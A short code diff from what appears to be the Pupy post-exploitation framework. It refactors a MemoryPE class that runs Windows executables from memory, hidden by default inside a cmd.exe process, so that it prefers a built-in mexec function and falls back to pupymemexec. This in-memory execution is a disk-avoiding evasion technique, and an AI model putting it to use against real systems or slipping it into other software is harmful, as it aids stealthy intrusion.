@@ -30,13 +30,18 @@
 # POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
-import pupymemexec
 import ctypes
 import threading
 import rpyc
 
 from ctypes.wintypes import DWORD, HANDLE, BOOL, LPVOID, UINT
 from ctypes import byref, create_string_buffer, POINTER, WinError
+
+from pupy import is_supported, mexec
+
+if not is_supported(mexec):
+    import pupymemexec
+    mexec = pupymemexec.run_pe_from_memory
 
 ERROR_BROKEN_PIPE = 0x6D
 
@@ -74,6 +79,7 @@ PIPE_NOWAIT = 0x1
 
 class MemoryPE(object):
     ''' run a pe from memory. '''
+
     def __init__(self, raw_pe, args=[], suspended_process=None, hidden=True, dupHandle=None):
         self.cmdline = suspended_process or 'cmd.exe'
 
@@ -136,7 +142,7 @@ class MemoryPE(object):
             self.terminate = True
 
         try:
-            hProcess, pStdin, pStdout = pupymemexec.run_pe_from_memory(
+            hProcess, pStdin, pStdout = mexec(
                 self.cmdline, self.raw_pe, write_cb is not None,
                 self.hidden, self.dupHandle
             )
